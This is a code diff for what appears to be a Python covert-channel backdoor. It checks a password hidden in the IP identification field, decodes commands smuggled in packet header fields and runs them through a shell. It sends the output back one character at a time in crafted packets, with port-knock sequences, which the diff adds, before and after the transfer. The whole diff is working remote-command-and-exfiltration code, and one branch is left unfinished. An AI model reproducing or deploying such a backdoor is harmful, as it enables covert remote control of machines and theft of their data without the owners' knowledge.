@@ -41,7 +41,6 @@ def authenticated(packet):
 	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
 	ipIdent = ipHeader[3]
 
-	# check ip identification field for encrypted password
  	if ipIdent == pswd:
  		return True
 
@@ -58,7 +57,6 @@ def checkCommand(ip, proto, data, pacType):
 	elif pacType == 'icmp':
 		character = proto[2]
 
-	# print proto
 	if character < 256:
 		if character != 15:
 			command += chr(character)
@@ -80,8 +78,26 @@ def executeCommand(srcAddress, pacType, command):
 		sendThread.start()
 
 def sendResults(address, protocol, comm):
+	knockCode(address, protocol, True)
 	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
-	
+
 	# encrypt results 
 	for c in results:
 		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)
+
+	knockCode(address, protocol, False)
+
+def knockCode(address, protocol, openS):
+	if openS:
+		for k in config.knock:
+			print k
+			packet = IP(dst=address, id=k)
+			if protocol == 'tcp':
+				proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
+			elif protocol == 'udp':
+				proto = UDP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
+			elif protocol == 'icmp':
+				proto = ICMP()
+			send(packet/proto, verbose=0)
+	# still gotta close
+
